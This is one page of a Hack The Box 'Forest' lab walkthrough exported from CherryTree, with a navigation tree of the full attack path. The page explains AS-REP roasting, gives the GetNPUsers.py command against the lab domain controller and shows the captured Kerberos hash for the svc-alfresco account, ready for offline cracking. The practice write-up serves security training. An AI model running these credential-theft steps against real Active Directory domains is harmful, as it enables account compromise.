<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>getNPUsers.py</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
</head>
<body><div class="main"><div class="tree">
<p><a href="../HacktheBox--Windows_Boxes.html">Windows Boxes</a></p>
<p><a href="HacktheBox--Windows_Boxes--forest.html">forest</a></p>

<ol>
<li><a href="HacktheBox--Windows_Boxes--forest--nmapAutomator.html">nmapAutomator</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--forest--nmapAutomator--nmap_quickscan.html">nmap quickscan</a></li>
<li><a href="HacktheBox--Windows_Boxes--forest--nmapAutomator--nmap_basic_scan.html">nmap basic scan</a></li>
<li><a href="HacktheBox--Windows_Boxes--forest--nmapAutomator--nmap_UDP_scan.html">nmap UDP scan</a></li>
<li><a href="HacktheBox--Windows_Boxes--forest--nmapAutomator--nmap_full_scan.html">nmap full scan</a></li>
<li><a href="HacktheBox--Windows_Boxes--forest--nmapAutomator--nmap_vulns_scan.html">nmap vulns scan</a></li>
<li><a href="HacktheBox--Windows_Boxes--forest--nmapAutomator--Recon_Recommendations.html">Recon Recommendations</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--forest--nmapAutomator--Recon_Recommendations--smb_recon.html">smb recon</a></li>
<li><a href="HacktheBox--Windows_Boxes--forest--nmapAutomator--Recon_Recommendations--ldap_recon.html">ldap recon</a></li>
</ol>
</ol>
<li><a href="HacktheBox--Windows_Boxes--forest--ldap.html">ldap</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--forest--ldap--recon_suggestion_from_nmapAuto.html">recon suggestion from nmapAuto</a></li>
<li><a href="HacktheBox--Windows_Boxes--forest--ldap--ldapsearch_w-_DC.html">ldapsearch w/ DC</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--forest--ldap--ldapsearch_w-_DC--grep_-i_memberof.html">grep -i memberof</a></li>
<li><a href="HacktheBox--Windows_Boxes--forest--ldap--ldapsearch_w-_DC--search_objectclass_person.html">search objectclass person</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--forest--ldap--ldapsearch_w-_DC--search_objectclass_person--grep_sAMAccountName.html">grep sAMAccountName</a></li>
<li><a href="HacktheBox--Windows_Boxes--forest--ldap--ldapsearch_w-_DC--search_objectclass_person--userlist.ldap.html">userlist.ldap</a></li>
<li><a href="HacktheBox--Windows_Boxes--forest--ldap--ldapsearch_w-_DC--search_objectclass_person--extra_username_in_rpcclient.html">extra username in rpcclient</a></li>
</ol>
</ol>
</ol>
<li><a href="HacktheBox--Windows_Boxes--forest--Initial_Foothold.html">Initial Foothold </a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--forest--Initial_Foothold--smb.html">smb</a></li>
<li><a href="HacktheBox--Windows_Boxes--forest--Initial_Foothold--password_spray_user_accts_w-_custom_password_list.html">password spray user accts w/ custom password list</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--forest--Initial_Foothold--password_spray_user_accts_w-_custom_password_list--hashcat_best64_rule.html">hashcat best64 rule</a></li>
<li><a href="HacktheBox--Windows_Boxes--forest--Initial_Foothold--password_spray_user_accts_w-_custom_password_list--add_!s_-_toggle1.rule.html">add !s / toggle1.rule</a></li>
<li><a href="HacktheBox--Windows_Boxes--forest--Initial_Foothold--password_spray_user_accts_w-_custom_password_list--make_passwords_length_7_minimum.html">make passwords length 7 minimum</a></li>
<li><a href="HacktheBox--Windows_Boxes--forest--Initial_Foothold--password_spray_user_accts_w-_custom_password_list--crackmapexec.html">crackmapexec</a></li>
<ol>
<li><a href="-forest--Initial_Foothold--password_spray_user_accts_w-_custom_password_list--crackmapexec--null_authentication_allows_domain_enumeration.html">null authentication allows domain enumeration</a></li>
<li><a href="heBox--Windows_Boxes--forest--Initial_Foothold--password_spray_user_accts_w-_custom_password_list--crackmapexec--crackmapexec_Brute_Force.html">crackmapexec Brute Force</a></li>
</ol>
<li><a href="HacktheBox--Windows_Boxes--forest--Initial_Foothold--password_spray_user_accts_w-_custom_password_list--enum4linux.html">enum4linux</a></li>
</ol>
<li><a href="HacktheBox--Windows_Boxes--forest--Initial_Foothold--getNPUsers.py.html">getNPUsers.py</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--forest--Initial_Foothold--getNPUsers.py--hashcat_BF_ticket.html">hashcat BF ticket</a></li>
<li><a href="HacktheBox--Windows_Boxes--forest--Initial_Foothold--getNPUsers.py--evil-winrm.html">evil-winrm</a></li>
</ol>
</ol>
<li><a href="HacktheBox--Windows_Boxes--forest--privesc.html">privesc</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--forest--privesc--sharphound.html">sharphound</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--forest--privesc--sharphound--run_SharpHound.exe_on_victim.html">run SharpHound.exe on victim</a></li>
<li><a href="HacktheBox--Windows_Boxes--forest--privesc--sharphound--encode-copy-paste_files_back_to_attack_machine.html">encode/copy/paste files back to attack machine</a></li>
<li><a href="HacktheBox--Windows_Boxes--forest--privesc--sharphound--OR_set_up_smb_share_between_attack_and_victim_machines.html">OR set up smb share between attack and victim machines</a></li>
</ol>
<li><a href="HacktheBox--Windows_Boxes--forest--privesc--neo4j.html">neo4j</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--forest--privesc--neo4j--bloodhound.html">bloodhound</a></li>
<li><a href="HacktheBox--Windows_Boxes--forest--privesc--neo4j--shortest_path_from_owned_Principals.html">shortest path from owned Principals</a></li>
<ol>
<li><a href="ox--Windows_Boxes--forest--privesc--neo4j--shortest_path_from_owned_Principals--query_shortest_path_to_domain_admin_from_owned_principles.html">query: shortest path to domain admin from owned principles</a></li>
<li><a href="HacktheBox--Windows_Boxes--forest--privesc--neo4j--shortest_path_from_owned_Principals--WritedACL_Abuse_info.html">WritedACL Abuse info</a></li>
</ol>
<li><a href="HacktheBox--Windows_Boxes--forest--privesc--neo4j--report_summary.html">report summary</a></li>
</ol>
<li><a href="HacktheBox--Windows_Boxes--forest--privesc--attackpath.html">attackpath</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--forest--privesc--attackpath--Create_a_user_on_the_domain.html">Create a user on the domain</a></li>
<li><a href="HacktheBox--Windows_Boxes--forest--privesc--attackpath--Add_the_user_to_the_Exchange_Windows_Permission_group.html">Add the user to the Exchange Windows Permission group</a></li>
<li><a href="HacktheBox--Windows_Boxes--forest--privesc--attackpath--Give_the_user_DcSync_privileges.html">Give the user DcSync privileges</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--forest--privesc--attackpath--Give_the_user_DcSync_privileges--Add-DomainObjectAcl_error.html">Add-DomainObjectAcl error</a></li>
</ol>
<li><a href="cktheBox--Windows_Boxes--forest--privesc--attackpath--Perform_a_DcSync_attack_and_dump_the_password_hashes_of_all_the_users_on_the_domain.html">Perform a DcSync attack and dump the password hashes of all the users on the domain</a></li>
<li><a href="HacktheBox--Windows_Boxes--forest--privesc--attackpath--Perform_a_Pass_the_Hash_attack_to_get_access_to_the_administrator’s_account.html">Perform a Pass the Hash attack to get access to the administrator’s account</a></li>
</ol>
</ol>
<li><a href="HacktheBox--Windows_Boxes--forest--user-root.html">user/root</a></li>
<li><a href="HacktheBox--Windows_Boxes--forest--Lessons_Learned.html">Lessons Learned</a></li>
</ol></div>
<div class="page"><h1><b><u>getNPUsers.py</u></b></h1><span style="color:#24ff00;">If </span><span style="color:#ffa500;">kerberos pre-authentication </span><span style="color:#24ff00;">is disabled on any of the box's accounts, we can use the </span><span style="color:#ffa500;">GetNPUsers</span><span style="color:#24ff00;"> impacket script to send a dummy request for authentication. The </span><span style="color:#ffa500;">Key Distribution Center KDC </span><span style="color:#24ff00;">will then return a </span><span style="color:#ffa500;">Ticket Generating Ticket TGT</span><span style="color:#24ff00;"> that is encrypted with the user's password. From there, we can take the encrypted TGT, run it through a password cracker and brute force the password</span><br /><br /><span style="color:#ffa500;">GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 -request</span><br /><img src="images/1167-1.png" alt="images/1167-1.png" /><br /><img src="images/1167-2.png" alt="images/1167-2.png" /><span style="color:#24ff00;"><br />the </span><span style="color:#ffa500;">Kerberos pre-authentication </span><span style="color:#24ff00;">option has been disabled fr the user </span><span style="color:#ffa500;">svc-alfresco</span><span style="color:#24ff00;"> and the KDC gave us back a TGT with the user's password<br /><br /></span><span style="color:#ffff00;">$krb5asrep$23$svc-alfresco@HTB.LOCAL:4933542ada6053e22fa16eacac49dc5d$6f4f91cc61441ebca25cad737b2941e4349126068e0e575b7b13d0ff5b748acfb529e8d18353750a618ef3a16e506ad9e9beb93e932f2fc088357d0fe8e3180d69c572d7561d62d5dd31fce165b10088f3a79f6b0a7d31f1dd6209e08e42d14f540a909f2803b182d588a9f3171c99282c88d29c17e9774c7f69c0e60a9c12f2cb2f2440468f61684b8f6e992e2b10b7620c9bd8891e6f7978cdb665e29417df2bd6f2003373babc82a92d07a1e9cf5a8566da337aee509bccbc8975e5ec749f201158e24730c811a485b9d810ea92df5cf741591d8a98ed44295cb750cd29f755b85a26f63c</span><span style="color:#24ff00;"><br /><br />lets save the ticket to </span><span style="color:#ffa500;">hash.txt</span><br /><br /></div></div>
</body></html>